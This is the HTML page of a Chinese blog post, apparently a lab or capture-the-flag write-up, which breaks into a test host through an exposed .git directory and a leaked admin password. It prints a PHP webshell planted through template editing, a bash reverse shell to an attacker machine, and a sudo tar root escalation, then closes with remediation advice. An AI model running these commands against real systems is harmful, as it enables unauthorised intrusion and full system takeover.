@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.3.1/css/all.min.css" integrity="sha256-4Lad8m4ZWW1Lgb9+sMVLYEfnIh7BjV1NQMEe79Pviks=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"etreamour.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="本文记录渗透测试实验1的操作过程及思路。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试实验1">
+<meta property="og:url" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/index.html">
+<meta property="og:site_name" content="欢迎访问我的博客">
+<meta property="og:description" content="本文记录渗透测试实验1的操作过程及思路。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%871.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%872.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%873.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%874.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%875.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%876.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%877.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%878.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%879.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%8710.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%8711.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%8712.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%8713.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%8714.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%8715.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%8716.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%8717.png">
+<meta property="article:published_time" content="2026-10-12T03:23:04.000Z">
+<meta property="article:modified_time" content="2026-10-27T03:38:46.998Z">
+<meta property="article:author" content="Xzt">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%871.png">
+
+
+<link rel="canonical" href="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/","path":"2026/10/12/渗透测试实验1/","title":"渗透测试实验1"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>渗透测试实验1 | 欢迎访问我的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-search popup-trigger" aria-label="搜索" role="button">
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">欢迎访问我的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">学习记录，分享知识</p>
+  </div>
+
+  <div class="site-nav-toggle" aria-label="切换导航栏" role="button">
+      <i class="fa fa-ellipsis fa-fw fa-lg"></i>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-layer-group fa-fw"></i>分类<span class="badge">6</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">11</span></a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Xzt</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://etreamour.github.io/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Xzt">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欢迎访问我的博客">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="渗透测试实验1 | 欢迎访问我的博客">
+      <meta itemprop="description" content="本文记录渗透测试实验1的操作过程及思路。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          渗透测试实验1
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-10-12 11:23:04" itemprop="dateCreated datePublished" datetime="2026-10-12T11:23:04+08:00">2026-10-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-10-27 11:38:46" itemprop="dateModified" datetime="2026-10-27T11:38:46+08:00">2026-10-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞笔记</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">本文记录渗透测试实验1的操作过程及思路。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>一、概况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">测试目标：[10.10.1.195]</span><br><span class="line">漏洞类型：[信息泄露]</span><br><span class="line">测试时间：2026年10月12日 - 2026年10月12日</span><br></pre></td></tr></table></figure>
+
+<p>二、信息收集与漏洞探寻</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.端口扫描:</span><br><span class="line">nmap -sV -sC -p- 10.10.1.195</span><br><span class="line">	-sV：服务/版本探测。对开放端口发送探针，识别服务名称和版本</span><br><span class="line">	-sC：使用Nmap默认NSE脚本扫描。等价于--script=default，不是“所有脚本”</span><br><span class="line">	-p-：扫描全部端口，等价于 -p 1-65535。默认只扫描 TCP 端口</span><br><span class="line">结果：Port：ssh服务22和web服务80</span><br><span class="line">22/tcp open ssh OpenSSH 9.6p1 Ubuntu</span><br><span class="line">80/tcp open http Apache httpd 2.4.58 (Ubuntu)</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%871.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2.目录爆破:</span><br><span class="line">dirsearch -u http://10.10.1.195 -e php,html,txt -x 403,404</span><br><span class="line">dirsearch：</span><br><span class="line">	-u：目标URL。</span><br><span class="line">	-e：指定扫描的文件扩展名后缀列表（Extensions，如php,html,txt）。</span><br><span class="line">	-x：排除不需要展示的HTTP状态码（Exclude codes，过滤无关结果）。</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%872.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.1.195 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt</span><br><span class="line">gobuster：</span><br><span class="line">	dir：指定模式为目录/文件枚举。</span><br><span class="line">	-u：目标URL。</span><br><span class="line">	-w：指定使用的字典文件路径（Wordlist）。</span><br><span class="line">	-x：自动为字典词条追加的文件后缀列表（如txt,bak,html）。</span><br><span class="line">	-t：并发线程数（Threads，默认10，加大线程可提升扫描速率）。</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%873.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.1.195/FUZZ -mc 200,301,302</span><br><span class="line">ffuf：</span><br><span class="line">	-w：指定字典文件路径。</span><br><span class="line">	-u：目标URL，URL 中的FUZZ是关键词占位符（字典内容会被替换注入到该位置）。</span><br><span class="line">	-mc：仅匹配并显示符合指定状态码的结果（Match Codes，如200,301,302）。</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%874.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">结果：扫描暴露出/.git，/admin，/include，/templates等主要目录结构</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3.漏洞探寻:</span><br><span class="line">curl -s 10.10.1.195/.git/HEAD</span><br><span class="line">-s是curl --silent的缩写，表示静默模式</span><br><span class="line">结果：master节点</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%875.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s 10.10.1.195/.git/logs/HEAD</span><br><span class="line">结果：获取到git更新日志信息，已知v1.0版本使用过明文密码，v1.2进行修改</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%876.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git-dumper http://10.10.1.195/.git/ ./yx_source（./yx_source可换成本地目录地址）</span><br><span class="line">grep -rniE &quot;password|passwd|admin|root|flag|key|secret|conn|mysql&quot; ./</span><br><span class="line">结果：筛选出admin和password关键字段，了解到用户和密码配置在./includes/config.php文件中有配置，获取到当前版本的密码为哈希加密</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%877.png" class="">
+
+<p>三、漏洞利用获取可交互Shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.漏洞利用:</span><br><span class="line">git log -p includes/config.php</span><br><span class="line">结果：查看git记录修改的日志，获取到v1.0版本用户名：admin明文密码：P0rtal_Adm1n_2026!</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%878.png" class="">
+
+<p>登录账户密码验证：http :&#x2F;&#x2F;10.10.1.195&#x2F;admin</p>
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%879.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">结果：登录成功，后台提供“模板设置”功能，可编辑模板文件，例如templates/footer.php。由于后台未对模板内容做严格过滤，且Web目录对www-data用户可写，因此可以写入PHP一句话木马。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2.反弹Shell:</span><br><span class="line">&lt;?php system($_GET[&quot;c&quot;]); ?&gt;]</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%8710.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.10.1.195/templates/footer.php?c=id</span><br><span class="line">结果：添加一句话木马验证反弹shell，是否可以写入访问</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%8711.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">curl -s -G http://10.10.1.195/templates/footer.php --data-urlencode &quot;c=bash -c &#x27;bash -i &gt;&amp; /dev/tcp/172.16.13.169/4444 0&gt;&amp;1&#x27;&quot;</span><br><span class="line">	-G：把后面 --data-urlencode 的内容当作 GET 请求的查询参数，拼到 URL 后面</span><br><span class="line">	--data-urlencode：会把这些特殊字符转成 %20、%26、%3E 这种安全格式</span><br><span class="line">	bash -c &#x27;...&#x27;：表示：启动一个 bash，并执行单引号里的内容。</span><br><span class="line">	bash -i：启动一个交互式 bash，也就是能接受你输入命令的 shell。</span><br><span class="line">	&gt;&amp; /dev/tcp/172.16.13.169/4444</span><br><span class="line">	这是 bash 的特殊功能：</span><br><span class="line">	把标准输出和标准错误都重定向到 /dev/tcp/172.16.13.169/4444</span><br><span class="line">	0标准输入</span><br><span class="line">	1标准输出</span><br><span class="line">	</span><br><span class="line">攻击机监听：[nc -lvnp 4444]</span><br><span class="line">结果：监控端口，反弹shell成功</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%8712.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">升级简陋shell为完整交互式bash终端（防止打错了不能删除）</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%8713.png" class="">
+
+<p>四、权限提升与目标验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.信息收集:</span><br><span class="line">直接提权：sudo su -</span><br><span class="line">查找SUID程序：find / -perm -4000 2&gt;/dev/null</span><br><span class="line">查看基础信息：</span><br><span class="line">uname -a</span><br><span class="line">cat /etc/os-release</span><br><span class="line">结果：获取root提权信息，查找可利用点</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%8714.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2.特权审计:</span><br><span class="line">排查当前用户权限：sudo -l</span><br><span class="line">结果：查看到当前用户的tar命令提权不需要密码</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%8715.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3.提权执行:</span><br><span class="line">sudo提权执行：sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%8716.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4.目标Flag验证:</span><br><span class="line">查看路径：pwd</span><br><span class="line">回根目录：cd</span><br><span class="line">列出文件：ls</span><br><span class="line">查看root文件内容：cat root.txt</span><br><span class="line">结果：读取到flag文件</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C1/%E5%9B%BE%E7%89%8717.png" class="">
+
+<p>五、漏洞定级与修复建议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">1.漏洞利用链条:</span><br><span class="line">[外网端口扫描</span><br><span class="line">→ 目录爆破发现 .git</span><br><span class="line">→ Git 源码泄露</span><br><span class="line">→ 历史记录泄露管理员明文密码</span><br><span class="line">→ 登录后台</span><br><span class="line">→ 模板编辑写入一句话木马</span><br><span class="line">→ 反弹 shell</span><br><span class="line">→ sudo tar 提权</span><br><span class="line">→ 读取 flag]</span><br><span class="line">结果：根据IP地址扫描获取端口信息，目录结构等-&gt;获取到/.git目录-&gt;拉取下载git文件，查看内部日志信息获取到历史版本-&gt;拉取日志获取到管理员登录账密-&gt;d登录验证-&gt;发现可插入楼漏洞点，设置一句话木马验证-&gt;实现反弹shell，进行监听登录-&gt;root提权-&gt;验证Flag</span><br><span class="line">2.漏洞定级: 严重</span><br><span class="line">评级：[严重/高危/中危/低危]</span><br><span class="line">评级理由：直接扫描出整个git目录结构，可以反弹shell进行root提权。信息泄露导致后台凭据泄露，进而获得代码执行权限，最终通过配置不当提权至root，完全控制目标系统。</span><br><span class="line">3. 整改建议:</span><br><span class="line">- 代码层：</span><br><span class="line">	删除生产环境中的.git、.svn等版本控制目录，禁止Web访问。</span><br><span class="line">	不在源码中硬编码密码、密钥等敏感信息，使用环境变量或密钥管理服务。</span><br><span class="line">	密码使用强哈希算法（如bcrypt、Argon2）并加盐，避免SHA1、MD5。</span><br><span class="line">	后台模板编辑功能应严格限制，禁止直接写入PHP代码；对编辑内容进行白名单校验、转义，禁用危险函数。</span><br><span class="line">	后台增加多因素认证、登录失败锁定、验证码、IP白名单。</span><br><span class="line">	在 PHP 中通过disable_functions禁用system、exec、shell_exec、passthru、popen等危险函数。</span><br><span class="line">遵循最小权限原则，Web目录不应允许执行上传或编辑的脚本。</span><br><span class="line">- 中间件层：</span><br><span class="line">	Apache/Nginx配置禁止访问.git、.svn、.env等敏感文件。</span><br><span class="line">	限制HTTP方法，关闭不必要的模块。</span><br><span class="line">	设置Web目录权限，仅允许必要目录可写，模板目录应只读。</span><br><span class="line">	部署WAF，检测命令注入、WebShell上传等攻击行为。</span><br><span class="line">	隐藏服务器版本信息，减少信息泄露。</span><br><span class="line">- 系统层：</span><br><span class="line">	最小权限原则：Web服务运行用户不应有sudo权限，尤其不能无密码执行tar等可提权命令。</span><br><span class="line">	定期审计/etc/sudoers和/etc/sudoers.d/，移除不必要的NOPASSWD和危险命令。</span><br><span class="line">	及时更新系统和软件补丁。</span><br><span class="line">	监控异常进程、网络连接，尤其是反弹shell连接。</span><br><span class="line">	配置日志审计，记录敏感操作。</span><br><span class="line">	对关键文件设置完整性监控（如AIDE、Tripwire）。</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B02/" rel="prev" title="渗透测试笔记2">
+                  <i class="fa fa-angle-left"></i> 渗透测试笔记2
